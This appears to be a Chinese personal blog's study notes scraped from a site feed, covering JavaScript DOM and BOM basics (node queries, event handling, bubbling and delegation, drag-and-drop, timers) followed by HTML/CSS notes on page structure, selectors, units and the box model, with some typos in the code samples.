Model，文档对象模型。用处就是可以让人用JS对HTML文档进行操作。文档：整个HTML网页文档对象：网页中的每一个部分都转换成了一个对象。（转换为对象后就可以使用纯面向对象的方式操作网页）模型：使用模型表示对象间的关系，方便获取对象。 节点Node，是构成网页的最基本的组成部分，网页中的每个部分都可以称为是节点，如html标签、属性、文本、注释、整个文档等。虽然都是节点但具体类型不同。节点类型不同属性和方法也不尽相同。常用节点分为四类： “文档节点”：整个HTML文档 “元素节点”：HTML文档中的HTML标签（元素就是标签） “属性节点”：元素的属性 “文本节点”：HTML标签中的文本内容可以使用innerHTML获取元素内部的HTML内容；innerText获取元素内部的文本内容，它和innerHTML类似，不同的是它会自动将HTML标签去除。 123456789101112![节点属性](shuxing.png)浏览器已经为我们提供了文档节点对象，文档节点代表的是整个网页。这个对象是window属性，可以在页面中直接使用。```html&lt;button id=&quot;btn&quot; onclick=&quot;alert(&#x27;按钮已点击&#x27;)&quot;&gt;我是一个按钮&lt;/button&gt;&lt;script&gt; // 获取到button对象 var btn = document.getElementById(&quot;btn&quot;); console.log(btn); // [object HTMLButtonElement] // 修改按钮的文字 btn.innerHTML = &quot;新的文字内容&quot;&lt;/script&gt; 文档的加载浏览器加载页面时按照自上而下的顺序，读取到一行运行一行。如果将script标签写到页面的上边，那么在代码执行时页面还没有加载，页面没加载那么DOM对象也没加载，会导致无法获取到DOM对象。将js代码编写到页面下部就是为了可以在页面加载完毕后再执行js代码。 onload事件对应的响应函数会在整个页面加载完成后才会触发。可以为window绑定一个onload事件window.onload = function9)&#123;&#125;以确保代码执行时所有的DOM对象已经加载完毕了，不会出现获取不到的情况。如果把js代码写在html文档的head中可以把它们都放在onload事件内。 事件文档或浏览器窗口中发生的一些特定交互瞬间。可以在事件对应的属性中编写一些js代码。类似上文中&lt;button id=&quot;btn&quot; onclick=&quot;alert(&#39;已点击&#39;)&quot;&gt;我是按钮&lt;/button&gt;的写法称为结构和行为耦合，不方便维护，不推荐使用。可以为按钮的对应事件绑定处理函数的形式来响应事件。当事件被触发时，其对应的函数将会被调用。像onclick这种为单机事件绑定的函数称为单机响应函数。 12345678910111213141516171819&lt;button id=&quot;btn&quot;&gt;我是一个按钮&lt;/button&gt;&lt;script&gt;// idStr：要绑定单机响应函数的对象的id属性值；fun：事件的回调函数function.myClick(idStr,fun)&#123; // 获取到button对象 var btn = document.getElementById(idStr); btn.onclick = fun;&#125;;myClick(mybtn,function()&#123; // 获取id为element1的元素 var ele1 = document.getElementById(&quot;element1&quot;); // 返回#element1的前一个兄弟节点（如果HTML文档内有换行，也可能获取到空白文本） var ps = ele1.previousSibling; alert(ps.innerHTML); // 使用previousElementSibling获取前一个兄弟元素，IE8以下不支持 var pe = ele1.previousElementSibling; &#125;);&lt;/script&gt; 常用的函数还有onscroll，该函数会在元素的滚动条滚动时触发；onmousemove，该事件会在鼠标在元素移动时触发； 事件对象在IE8及以下浏览器中，响应函数被触发时浏览器不会传递事件对象，而是将事件对象作为window对象的属性保存的。需要用var x = window.event.clientX;的形式调用。 event中的属性target表示触发事件的对象，用event.target.xxx的形式调用。 当事件的响应函数被触发时，浏览器每次都会将一个事件对象作为实参传递给响应函数。在事件对象中封装了当前事件相关的一切信息，比如鼠标的坐标、键盘哪个案件按下、鼠标滚轮的方向等。 1234567891011areaDiv.onmousemove = function(event)&#123; /*可以使用这种方法兼容IE if(!event)&#123; event = window.event; &#125;*/ //解决事件对象兼容性问题的方法:利用JS中的或语句，前者为true直接赋值，前者为false返回第二个值。 event = event || window.event; var x = event.clientX; var y = event.clientY; showMsg.innerHTML = &quot;x=&quot; + x + &quot;, y=&quot; + y;&#125; DOM查询的常见方法 元素节点，通过document对象调用方法getElementById()、getElementsByTagName()、getElementsByName()分别是通过id属性、标签名和name属性获取元素节点对象。其中通过id属性一定是获取唯一的对象，其他方法可以获取一组对象。方法getElementsByClassName()会返回一个 类数组 对象，返回当前节点的指定class属性值查询一组元素节点对象，但不支持IE8及以下。方法getElementsByTagName()会返回一个 类数组 对象，所有查询到的元素都会封装到对象中。主要用来操作表单。（类数组就是HTMLCollection）方法getElementsByName()应该注意，由于innerHTML用于获取元素内部的HTML代码，所以对于自结束标签没有意义。 读取元素节点的属性：直接使用元素.属性名。但读取class属性不能使用这种方式，而应该使用元素.className。（class是js中的保留字） 元素节点的子节点，通过具体的元素节点调用方法getElementsByTagName()，返回当前节点的指定标签名后代节点。返回一个 类数组 对象。属性childNodes，表示当前节点的所有子节点。返回一个 类数组 对象。该属性会获取包括文本节点在内的所有节点。 根据DOM标签，标签间的空白也会被当成文本节点！属性children获取当前元素的所有子元素。属性firstChild，表示当前节点的第一个子节点。属性firstElementsChild，获取当前元素的第一个子元素。属性lastChild，表示当前节点的最后一个子节点。 注意属性和方法使用方式的不同。 父节点和兄弟节点，通过具体的节点调用属性parentNode，表示当前节点的父节点。属性previousSibling，表示当前节点的前一个兄弟节点。如果HTML文档内有换行，也可能获取到空白文本。属性previousElementSibling，获取前一个兄弟元素，IE8以下不支持。属性nextSibling，表示当前节点的后一个兄弟节点。 选择器作为参数方法document.querySelector()需要一个选择器作为参数，可以根据一个CSS选择器来查询一个元素节点对象。使用该方法只能返回唯一的一个元素，如果满足条件的元素有多个，那么它只会返回第一个。可以使用document.querySelectorAll()，它与上面的方法类似，不同的是它会将符合条件的元素封装到一个数组中返回。即使符合条件的元素只有一个也会返回数组。 12345678910&lt;body&gt; &lt;div class=&quot;box1&quot;&gt; &lt;div&gt;这是box1中的div&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;script&gt; var div = document.querySelector(&quot;.box1 div&quot;); console.log(div.innerHTML);&lt;/script&gt; document中的其它属性属性body，它保存的是&lt;body&gt;``i`的引用。 属性html，它保存的是根标签&#96;&#96;i&#96;的引用。属性all，代表页面中的所有元素。document.all和document.getElementByTagName含义相同。 DOM增删改 使用innerHTML也可以完成DOM增删改的相关操作，但动作太大了，会把更大部分的HTML代码标记为修改过的状态。所以一般会两种方式结合使用。 document.createElement()用于创建一个元素节点对象，需要一个标签名作为参数，根据该标签名创建元素节点对象，并将创建好的对象作为返回值返回。 document.createTextNode()用于创建一个文本节点对象，需要一个文本内容作为参数，根据该内容创建文本节点，并将创建好的节点作为返回值返回。 .appendChild()用于向一个父节点中添加一个新的子节点。用法：父节点.appendChild(子节点)。 .insertBefore()用于向指定的 子节点 前插入新的子节点，因此调用该方法的一定是父元素。用法：父节点.insertBefore(新的子节点，指定的子节点)。 replaceChild()用于替换子节点，因此调用该方法的一定是父元素。用法：父节点.replaceChild(新的子节点，指定的子节点)。 removeChild()用于删除子节点，因此调用该方法的一定是父元素。用法：父节点.replaceChild(子节点)。一种更方便的、不用请它的父元素的方式：子节点.parentNode.replaceChild(子节点)。 123456789101112131415161718window.onload = function()&#123; myClick(&quot;mybtn&quot;,function()&#123; // 创建广州节点&lt;li&gt;广州&lt;/li&gt; var li = document.createElement(&quot;li&quot;); // 创建li元素节点 var gzText = document.createTextNode(&quot;广州&quot;); // 创建广州文本节点 li.appendChild(gzText); // 将gzText设置为li的子节点 var city = document.getElementById(&quot;city&quot;); // 将广州添加到city下 city.appendChild(li); &#125;)&#125; // 也可以直接利用innerHTML var city = document.getELementById(city); city.innerHTML += &quot;&lt;li&gt;广州&lt;/li&gt;&quot;; // 两种方法结合【推荐】 var li = document.createElement(&quot;li&quot;); li.innerHTML = &quot;广州&quot;; var city = document.getElementById(&quot;city&quot;); city.appendChild(li); 使用DOM操作CSS 能起到修改样式的只有style属性！ 通过JS修改元素的样式：元素.style.样式名 = 样式值。这里的样式值需要传入字符串，如”200px”。通过style属性设置的样式都是内联样式，而内联样式具有较高的优先级，所以通过JS修改的样式往往会立即显示。但如果在样式中写了!important那么它就会有最高优先级，即使通过JS也不能覆盖该样式，会导致JS修改样式失效。所以尽量别为样式添加!important。 如果CSS的样式名中含有减号”-“，如background-color，这种名称在JS中不合法。需要将这种样式名修改为驼峰命名法：去掉减号，然后将减号后的字母大写。 通过JS读取元素的样式：元素.style.样式名。 通过style属性读取到的都是内联样式！无法读取样式表中的样式。 读取元素的样式通过style属性读取到的都是内联样式，无法读取样式表中的样式。 （只有IE支持) 获取元素的当前显示的样式：元素.currentStyle.样式名。如果当前元素没有设置样式，则获取它的默认样式。 其它浏览器获取元素的当前显示的样式：元素.getComputedStyle()。这个方法是window的方法，可以直接使用。需要两个参数，第一个：要获取样式的元素，第二个：可以传递一个伪元素，很少用，一般都传null。该方法会返回一个对象，对象中封装了当前元素对应的样式。可以通过对象.样式名读取样式。如果获取的样式没有设置，则会获取到真实的值，而不是默认值。比如：没有设置width，它不会获取到auto，而是获取到实际的长度，和显示器大小、人为缩放都有关系。该方法不支持IE8及以下的浏览器。通过currentStyle和getComputedStyle()读到的样式都是只读的，不能修改。如果修改必须通过style属性。形如box1.currentStyle.width = &quot;200px&quot;的写法是行不通的。 总之，正常浏览器：getComputedStyle(box1,null).backgroundColorIE：如box1.currentStyle.backgroundColor 可以定义一个通用的函数，用来获取元素的当前的样式。需要两个参数：obj，要获取样式的元素；name，要获取的样式名。 123456789101112getStyle(box1,&quot;width&quot;);function getStyle(obj,name)&#123; if(window.getComputedStyle)&#123; // 加上window.，代表是以属性的形式调用。 // 不加就是变量 // 变量没有会报错，属性没有会报undefined return getComputedStyle(obj,null)[name]; // 正常浏览器的方式。这里注意由于name传入的是变量，所以需要用中括号的语法。 return obj.currentStyle.[name]； // IE8的方式 // 也可以用？ ：表达式整合成一条语句。 &#125;&#125; 其它样式操作的属性 这些 属性 都是不带px单位的，返回的只是数字，可以直接进行计算 属性clientX、clientY可以获取鼠标指针在当前可见窗口的坐标。 属性pageX、pageY可以获取鼠标指针在当前页面的坐标。 属性clientWidth、clientHeight：获取元素的可见宽度和高度。包括内容区和内边距，不包括边框。该属性是只读的，不能修改，想修改只能用style属性。 属性offsetWidth、offsetHeight：获取元素的整个宽度和高度。包括内容区、内边距和边框。。&#x2F;÷÷÷÷÷÷÷、 属性offsetParent：获取当前元素的最近的开启了定位的父元素。（定位默认static。）如果所有的祖先元素都没开启定位，返回body。 属性offsetLeft、offsetTop：获取当前元素相对于其定位父元素的水平、垂直 属性scrollHeight、scrollWidth：获取元素的滚动高度&#x2F;宽度。也就是整个滚动区域的高度&#x2F;宽度。（通过overflow：auto添加滚动条） 属性scrollLeft、scrollTop：获取水平&#x2F;垂直滚动条滚动的距离。Chrome认为浏览器的滚动条是body的，可以通过body.scrollTop获取；但事实上，滚动条出现是因为父元素容不下它，所以应该用body的父元素html获取。用var st = document.body.scrollTop || document.documentElement.scrollTop解决这个问题。 满足scrollHeight - scrollTop &#x3D;&#x3D; clientHeight说明垂直滚动条滚动到底。 事件的冒泡、委派、绑定和传播 向上冒泡，向下委派。 事件的冒泡冒泡（bubble）指的就是事件的向上传导，当后代元素的事件被触发时，其祖先元素的 相同事件 也会被触发。开发中，大部分情况下的冒泡都是有用的，如果不希望发生事件冒泡可以将事件对象的cancelBubble设置为true。 123456s1.onclick = function(event)&#123; event = event || window.event; // 取消冒泡：可以将事件对象的cancelBubble设置为true。 event.cancelBubble = true;&#125; 事件的委派场景：希望只绑定一次事件即可应用到多个元素上，即使元素是后添加的。可以尝试将其绑定给元素的共同的祖先元素。 事件的委派：指将事件统一绑定给元素的共同的祖先元素，这样当后代元素上的事件触发时，会一直冒泡到祖先元素。从而通过祖先元素的响应函数来处理。事件委派利用了冒泡，可以减少事件绑定的次数，提高程序的性能。 事件的绑定使用对象.事件 &#x3D; 函数的方法绑定响应函数，只能同时为一个元素的一个事件绑定一个响应函数，不能绑定过个，否则后面的会覆盖掉前面的。 通过addEventListener()方法也可以为元素绑定响应函数（IE8以上。IE8及以下用attachEvent()绑定事件，用法一样，除了第一个参数需要on和执行顺序相反。）。可以同时为一个元素的相同事件同时绑定多个响应函数，这样当事件触发时，响应函数将会按照函数绑定的顺序执行。参数：1.事件的字符串，不要on。比如onclick在这里写作click。2.回调函数，当事件触发时该函数会被调用。3.是否在捕获阶段触发事件，需要一个布尔值，一般都传false。 此外，addEventListener()的this是绑定事件的对象（如下面的btn01），attachEvent()中的this则是window。 123456btn01.addEventListener(&quot;click&quot;,function()&#123; alert(1);&#125;,false);btn01.addEventListener(&quot;click&quot;,function()&#123; alert(2);&#125;,false) 为了解决浏览器的兼容性问题，定义一个函数用来为指定元素绑定响应函数。需要注意addEventListener()中的this是绑定事件的对象，attachEvent()中的this是window，需要统一两个方法中的this。这里使用call()方法改变函数执行时的this，这个方法是函数对象的方法，需要通过函数对象来调用，所以我们在它外面套一层匿名函数。实现的效果是一样的，但满足了call的使用条件，再使用call修改this的指向。 12345678910111213141516// 三个参数分别为要绑定事件的对象，事件的字符串和回调函数// 由于拼串更为容易，所以第二个参数传的是没有on的function bind(obj,eventStr,callback)&#123; if(obj.addEventListener)&#123; // 大部分浏览器兼容的方式 obj.addEventListener(eventStr,callback,false); &#125;else&#123; // IE8及以下 // this是谁由调用方式决定。 // 原本的调用方式：obj.attachEvent(&quot;on&quot; + eventStr,callback) obj.attachEvent(&quot;on&quot; + eventStr,function()&#123; // 在匿名函数中使用回调函数以满足call的适用条件 callback.call(obj); &#125;) &#125;&#125; 事件的传播关于时间的传播，网景公司和微软公司有不同的理解：微软认为事件应该是由内向外传播，也就是当事件触发时应该先触发当前元素上的事件，然后再向当前元素的祖先元素上传播，也就是时间应该在冒泡阶段执行；网景公司认为事件应该由外向内传播，也就是当事件触发时应该先触发当前元素最外层的祖先元素的事件，然后再向内传播到后代元素，也就是时间应该在捕获阶段执行。 W3C综合了两个公司的方案，将事件传播分成了三个阶段： 捕获阶段：捕获阶段时从最外层的祖先元素向目标元素进行事件的捕获，但是默认捕获阶段内不会触发事件 目标阶段：事件捕获到目标元素，捕获结束开始在目标元素上触发事件 冒泡阶段：事件从目标元素向他的祖先元素传递，依次触发祖先元素上的事件 如果希望在捕获阶段就触发事件，可以将addEventListener()的第三个参数设置为true。一般情况下我们不会希望在捕获阶段触发事件，所以这个参数一般都是false。在IE8及以下的浏览器中没有捕获阶段。 方法setCapture()：调用一个元素的setCapture()方法以后，这个元素将会把下一次所有的鼠标按下相关的事件捕获到自身上。（流氓网站）方法releaseCapture()实现当鼠标松开时，停止对对象的捕获。这两个方法只有IE支持，火狐中不会报错，chrome会报错。可以用box1.setCapture &amp;&amp; box1.setCapture()实现浏览器兼容。 键盘事件 键盘事件通常绑定给可以获取到焦点的对象或document 按键被按下onkeydown。如果一直按住某个按键不松手事件会一直触发，为了防止误操作，第一次和第二次间隔会稍微长一点，其它的都很快。按键被松开onkeyup。【尽量避免使用】可以通过keyCode属性获取按键的ASCII编码。alert(event.keyCode)。现在是key属性。 实例：鼠标拖拽 当鼠标在被拖拽元素上按下时，开始拖拽—— onmousedown 当鼠标移动时，被拖拽元素跟随鼠标移动—— onmousemove 当鼠标松开时，被拖拽元素固定在当前位置—— onmouseup 12345678910111213141516171819202122232425var box1 = document,getElementById(&quot;box1&quot;);box1.onmousedown = function()&#123; // 鼠标按下，开始拖拽 event = event || window.event; // div的偏移量：鼠标.clientX - 元素.offsetLeft，Y和top同理 var ol = event.clientX - box1.offsetLeft; var ot = event.clientY - box1.offsetTop; document.onmousemove = function(event)&#123; // 注意这里是给document绑定 event = event || window.event; var left = event.clientX - ol; var top = event.clientY - ot; box1.style.left = left + &quot;px&quot;; // 修改位置。记得开绝对定位。 box1.style.top = top + &quot;px&quot;; &#125;; document.onmouseup = function()&#123; // 给document绑定。给box1绑定，如果页面有其他元素并且恰好在其他元素的范围内松开鼠标会有bug，因为触发的是其他元素的onmouseup // 取消onmousemove的效果。但如果只有这句也有bug，鼠标在页面其他地方点击也会触发 document.onmousemove = null; // 取消onmouseup document.onmouseup = null; &#125;; // 当拖拽一个网页中的内容时，浏览器会默认去搜索引擎中搜索内容，会导致拖拽功能异常。 // 这个是浏览器提供的默认行为，如果不希望发生可以通过return false取消默认行为。&#125;; BOM浏览器对象模型。BOM可以使我们通过JS操作浏览器，BOM中为我们提供了一组对象用来完成对浏览器的操作。常见的BOM对象如下： Window：代表整个浏览器的窗口，同时window也是网页中的全局对象。 Navigator：代表当前浏览器的信息，通过该对象可以识别不同的浏览器。由于历史原因，Navigator对象中的大部分属性都已经不能帮助我们识别浏览器了。一般我们只会用userAgent（这词等价于浏览器）来判断浏览器的信息。userAgent是一个含有用来描述浏览器信息的字符串，不同浏览器有不同的userAgent。如果userAgent还不能判断，可以通过一些浏览器中特有的对象来判断浏览器的信息。 Location：当前浏览器的地址栏信息，通过该对象可以获取地址栏信息或操作浏览器跳转页面。直接打印location则可以获取到地址栏的信息（当前页面的完整路径）。 如果直接将location属性修改为一个完整的路径或相对路径，则页面会自动跳转到该路径，并且会生成相应的历史记录。方法assign()：用来跳转到其他的页面，作用和直接修改location一样方法reload()：重新加载当前页面，作用和刷新一样。如果在方法中传递一个true作为参数，则会强制清空缓存并刷新页面。方法replace()：使用一个新的页面替换当前页面，调用完毕也会跳转页面。但和直接修改location属性不同的是，它不会生成历史记录，不能回退。 History：代表浏览器的历史记录，通过该对象不能获取到具体的历史记录，只能操作浏览器向前或向后翻页，而且该操作只在当次访问时有效。属性length：获取到当前访问的链接数量方法back()：回退到上一个页面，作用和浏览器的回退按钮一样方法forward()：回退到下一个页面，作用和浏览器的前进按钮一样方法go()：跳转到指定页面，需要一个整数作为参数——1:向前跳转一个，相当于forward；其它正整数同理。负数就是回退。 Screen：代表用户的屏幕信息，通过该对象可以获取到用户显示器的相关信息（主要用在移动端） 虽然描述的时候大写，但用起来的时候都是小写 这些BOM对象在浏览器中都是作为window对象的属性保存的，都是全局对象。可以通过window对象来使用，由于是全局对象也可以直接使用。console.log(window.location)和console.log(location)都行。 定时器 方法setInterval()：将一个函数每隔一段时间执行一次。参数——1.回调函数，该函数会每隔一段时间被调用一次；2.调用的间隔时间，单位ms返回值——一个Number类型的数据，从1开始。这个数字用来作为定时器的唯一标识。 123setInterval(function()&#123; count.innerHTML = num++;&#125;,300) 很多情况下，要想不出错需要在开启定时器之前将 当前元素 上的其它定时器关闭 方法clearInterval()用来关闭定时器，传入的参数即是定时器的标识。参数——它可以接受任意参数，都不会报错。如果参数是一个有效的定时器的标识，则停止对应的定时器；如果参数不是有效的标识就什么都不做。 12345678910111213141516171819202122var imgArr = [&quot;1.jpg&quot;,&quot;2.jpg&quot;,&quot;3.jpg&quot;];var index = 0; // 保存当前图片的索引var timer; // 保存定时器的标识var btn01 = document.getElementById(&quot;btn01&quot;); // btn01是开始按钮btn01.onclick = function()&#123; // 解决：每点击一次按钮就会开启一个定时器，点击多次就会开启多个定时器，会导致图片切换速度过快，并且由于timer的值会被刷新就只能关闭最后一次开启的定时器的问题 // 在开启定时器之前将当前元素上的其它定时器关闭 clearInterval(timer); timer = setInterval(function()&#123; index++; // 判断索引是否超过最大索引 if(index &gt;= imgArr.length)&#123; index = 0; &#125; img1.src = imgArr[index]; &#125;,1000);&#125;;var btn02 = document.getElementById(&quot;btn02&quot;); // btn02是结束按钮btn02.onclick = function()&#123; clearInterval(timer);&#125;;","categories":[{"name":"前端","slug":"前端","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"JS","slug":"前端/JS","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/JS/"}],"tags":[{"name":"JS","slug":"JS","permalink":"https://avalooooooon.github.io/tags/JS/"}]},{"title":"HTML/CSS笔记","slug":"HTML-CSS笔记","date":"2022-01-09T13:41:50.000Z","updated":"2022-01-09T13:41:50.000Z","comments":true,"path":"2022/01/09/HTML-CSS笔记/","link":"","permalink":"https://avalooooooon.github.io/2022/01/09/HTML-CSS%E7%AC%94%E8%AE%B0/","excerpt":"","text":"HTML w3school的标签文档：tagsMDN的标签文档: tags Vscode安装的扩展：Live Server； 在浏览器中，检查元素的elements窗口显示的是代码在内存中的结构 HTML基本结构 vs code中新建.html文件，输入一个感叹号后直接tab可一键生成一个最简单的HTML模版。 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;!DOCTYPE html&gt;&lt;html lang = &quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt; &lt;/title&gt; &lt;style&gt; /* css中的注释 */ nav,article,aside&#123; float:left; &#125; ul&#123; margin:0; list-style:none; &#125; &lt;/style&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/reset.css&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;header&gt; &lt;span&gt;&lt;/span&gt; &lt;/header&gt; &lt;main&gt; &lt;nav&gt;&lt;/nav&gt; &lt;article&gt;&lt;/article&gt; &lt;aside&gt;&lt;/aside&gt; &lt;/main&gt; &lt;footer&gt; &lt;span&gt;&lt;/span&gt; &lt;/footer&gt; &lt;ul&gt; &lt;li&gt; &lt;a href=&quot;javascript:;&quot;&gt; &lt;/a&gt; &lt;li&gt; &lt;li&gt; &lt;li&gt; &lt;/ul&gt; &lt;/body&gt; &lt;/html&gt; &lt;DOCTYPE&gt;:文档声明，用来告诉浏览器当前网页的版本（语法规范）。就是html5的文档声明。 &lt;html&gt;: html的根标签，除了文档声明，所有内容都要写在根元素内；lang &#x3D; “en”指定网页语言为英语，会触发浏览器的翻译功能，设置为zh则不会触发翻译 &lt;head&gt;: 给搜索引擎看帮助其解析网页，其中的内容不会出现在网页中 &lt;meta&gt;: 用来设置网页的元数据（与生俱来的、不会变的、底层的数据），也是给搜索引擎看的；可以通过该标签设置网页字符集charset(utf-8)；name；keywords是网站关键字，给搜索引擎分类网站的；description，介绍网站，会显示在搜索引擎搜索的结果中；title，作为搜索结果超链接中的文字显示。 &lt;title&gt;: 网页标题，在标题栏出现 &lt;body&gt;: 需要展示的所有内容都在其中 &lt;div&gt;: 没有语义，表示一个区块，是主要的布局元素 &lt;span&gt;: 没有语义，表示一个行内元素，是主要的布局元素 HTML属性属性是一个 名值对（x&#x3D;y，即color&#x3D;”red”），属性值应该使用引号引起来，可以是单引号也可以是双引号，但要一致。属性用来设置标签中的内容如何显示， HTML实体（转义）如需要在网页中书写特殊符号（多个连续空格、内容两侧的大于号和小于号），需要使用HTML中的实体（转义字符）。语法：&amp;实体的名字;。如，空格：&amp;nbsp;，多个连续空格可以写成&amp;nbsp;&amp;nbsp;&amp;nbsp;，大于号：&amp;gt;，小于号：&amp;lt; 在w3school:html实体中查询更多。 CSS层叠样式表。声明块中的声明是名值对，名和值用冒号连接。如color:red。注意这里CSS中的名值对用冒号链接；html中的属性值用的则是等号，如color=red。 样式的继承：为一个元素设置样式的同时也会应用到它的后代元素上。但背景相关的、布局相关的等一些样式不会被继承。 内联（行内）样式： 开发时不要使用内联样式！ 内部样式表：将样式全部写到&lt;head&gt;内的&lt;style&gt;标签里。 外部样式表：将样式写到外部的xxx.css文件中，再通过&lt;link&gt;标签引入。 浏览器的默认样式1234*&#123; margin:0; padding:0;&#125; 或者：使用重置样式表：style.css直接全部去除了浏览器的默认样式，normalize.css对不同浏览器的默认样式进行了统一。 长度和颜色单位 长度 像素（px）：根据屏幕不同而不同，像素越小的屏幕越清晰。同样的200px在不同设备下显示效果不同。 百分比：是相对其父属性而言。可以使子元素跟随父元素的改变而改变。 em：相对于当前元素（自身）的font- size。1em&#x3D;1font-size。一般浏览器默认的字体大小都是16px，所以10em就是160px。会根据字体大小的改变而改变。 rem：相对于根元素（&lt;html&gt;标签）的font- size。 vw：视口宽度（viewport width）。 颜色 RGB值：rgb(红色,绿色,蓝色) RGBA值：rgba(红色,绿色,蓝色,.5)，第四个是透明度：1为完全不透，0为完全透明，.5为半透明 16进制值：#FFFFFF。两两重复可以简写。 HSL值：（同理有HSLA，色相：0～360+饱和度：颜色浓度0%～100%+亮度：0%～100%+透明度） 像素、（移动端）完美视口 移动端默认的视口大小是980px(css像素)。所以默认情况下，移动端的像素比就是980&#x2F;移动端宽度（980&#x2F;760，iPhone6），也就是一个css像素对应零点几个移动端的物理像素。又因为移动端的物理像素本来就小，所以如果我们直接在网页中编写移动端代码，在980的视口中像素比会很不好，导致网页中的内容很小。这就要求编写移动页面时必须确保有一个比较合理的像素比。 每一款移动设备设计时都会有一个最佳的像素比，一般把像素比设置为该值就可得到最佳效果。将像素比设置为最佳像素比的视口大小我们称其为完美视口。不同设备完美视口的大小不同：iPhone6-375px，iPhone6 plue-414px。由于不同设备视口和像素比不同，所以同样的375像素在不同设备下意义不同，比如在iPhone6中375是全凭，在plus中就会缺一块。所以在移动端开发时就不能再使用px进行布局了。 可以通过&lt;meta&gt;标签设置视口大小。&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width&quot;&gt;就把网页的视口设置为完美视口。总之就是再写移动端的页面时就把这句先写上。 移动端开发解决比例问题的最终方案使用less+rem的方法，换算设计图px和代码rem的比例。 12345678// total-width是设计图的宽度@total-width:750; html&#123; font-size:(100vw/@total-width)*40;&#125;.box&#123; height:175/40rem; // 这里的175指的是设计图上的宽度为175px&#125; 选择器 样式冲突：冲突时由选择器的权重（优先级）决定。比较时要将所有选择器的优先级相加计算。但选择器的累加不会超过其最大的数量级，即类选择器最高也不会超过id选择器的优先级。并集（分组）选择器单独计算。 「选择器越具体，优先级越高」：内联样式 1000 &gt; id选择器 100&gt; 类和伪类选择器 10&gt; 元素选择器 1&gt; 通配选择器 0&gt; 继承的样式 没有优先级；在样式最后加!important直接升为最高优先级。若优先级计算后相等，优先使用靠下的样式。 元素选择器：根据标签名选中指定的元素。语法：标签名&#123;&#125;，如h1&#123;&#125;。 id选择器：根据id选中 一个 元素。语法：#id属性值&#123;&#125;。 类选择器：根据类名选中 一组 元素。语法：.class属性值&#123;&#125;。 一个标签可以有多个class，class中间用空格分开。如&lt;p class=&quot;cla1 cla2&quot;&gt;。 通配选择器：选中页面所有元素。语法：*&#123;&#125;。 复合选择器 交集选择器：选择器1选择器2选择器n&#123;&#125;，如div.cla1&#123;&#125;。 如含有元素选择器，必须使用元素选择器开头。 并集选择器（分组选择器）:选择器1,选择器2,...,选择器n&#123;&#125;。 关系选择器 父元素（ 直接 包含子元素）、子元素（ 直接 被父元素包含）；祖先元素（直接或间接包含后代元素）、后代元素；兄弟元素 子元素选择器：父元素 &gt; 子元素&#123;&#125;。 后代元素选择器：祖先 后代&#123;&#125; 兄弟元素选择器：1. 选择 下一个 兄弟，前一个 + 下一个&#123;&#125;。2. 选择 下面所有 兄弟，前一个 ～ 下一个&#123;&#125;。 属性选择器 选择含有指定属性的元素：[属性名] 选择含有指定属性和属性值的元素：[属性名=属性值] 选择属性值以指定值开头的元素：[属性名^=指定值] 选择属性值以指定值结尾的元素：[属性名$=指定值] 选择属性值中含有指定值的元素：[属性名*=指定值] 伪类选择器伪类，一般使用:开头，是一种特殊的类，是不存在的类，用于描述一个元素的特殊 状态 。如第一个子元素、被点击的元素、鼠标移入的元素… 排序伪类语法：:first-child，第一个子元素；:nthchild()，选中第n个子元素，具体n值写在括号内； :nthchild()，括号内的特殊值括号内写n则为全选，2n或even为选中偶数位元素，2n+1或odd为选中奇数位元素； 以上的伪类都是根据所有的子元素进行的排序！想要在同类型元素中进行排序，需要使用形如:first-of-type的伪类，用法相似。 否定伪类如:not(): 将符合条件的元素从选择器中去除。eg:.cla1 li:not(:last-child)。 超链接伪类没访问过的链接：可用:link访问过的链接：:visited。由于隐私原因，只能修改链接颜色鼠标状态：:hover为鼠标移入的状态。 :active为鼠标点击的状态。 事实上，“ :link ” 可以表示一切正常的链接。 伪元素选择器伪元素，一般使用::开头，是一种特殊的元素，是不存在的元素。类似伪类。 如::first-letter。默认是行内元素！ ::before、::after：必须结合content属性使用。 content中的内容是通过css添加的，是不能选中的！ 示例：1234div::before&#123; content:&#x27;abc&#x27;; color:red;&#125; 盒模型 计算盒子整体 可见 大小时需要把内容区content、内边框padding、边框border都计算在内！ 内容区：content width和height设置的是内容区（content）的大小。 内边距：padding， 影响盒大小；背景颜色会延伸到内边距（默认时）。 边框：border。 需要至少设置3个样式——宽度（border-width）、颜色（border- color）、样式（border-style，设置为none则无边框）。 简写属性：border: solid 10px red，无顺序要求。 关于border-width、border- color和border-style1.都可以省略（有默认值）；都有border-xxx-width/color/style的形式2.四个值：上，右，下，左；三个值：上，左右，下；两个值：上下，左右 外边框：margin，不影响盒子可见框大小，但影响盒子的实际大小和位置。 注意，margin-top和margin-left移动自己，margin-bottom挤别人，margin-right经常没用。可以设置为负值。 轮廓：outline，用来设置元素的轮廓线，用法和border一摸一样。唯一和border不一样的点就是轮廓不会影响可见框的大小。 阴影：box-shadow，用来设置元素的阴影效果，不会影响页面布局。起始位置和元素本身的位置完全重合。 box-shadow: 2px 5px 10px rgba(0,0,0,.3) 第一个值：水平偏移，正值向右，负值向左。 第二个值：垂直偏移，正值向下，负值向上。 第三个值：模糊半径。即使前两个值都为0，设置了模糊半径也能看到阴影。 第四个值：颜色，常用带透明度的rgba。 圆角：border-radius，可以分别指定四个角的圆角。 对某个角同时指定两个半径：椭圆圆角。border-top-left-radius:10px 20px 四个值：左上 右上 右下 左下 三个值：左上 右上&#x2F;左下 右下 两个值：左上&#x2F;右下 右上&#x2F;左下 不到四个值，缺哪个找哪个的对角值，这个值代表了两个角的半径。 将元素设置为圆形： border-radius:50% 水平布局一个元素在其父元素的内容区中存在，该元素的水平布局 必须满足： 左外边距+左边框+左内边距+width+右内边距+右边框+右外边距 &#x3D; 其父元素内容区的宽度但元素设置浮动float后，该等式不需要强制成立！ 等式中的宽度width，左外边距margin-left，左内边距padding-left可以设置为auto。 如果不满足，如何调整？（注意margin可以为负） 如果这7个值没有auto，浏览器会自动调整margin-right。 如果这7个值有一个auto，浏览器会自动调整auto。width的默认值即为auto。 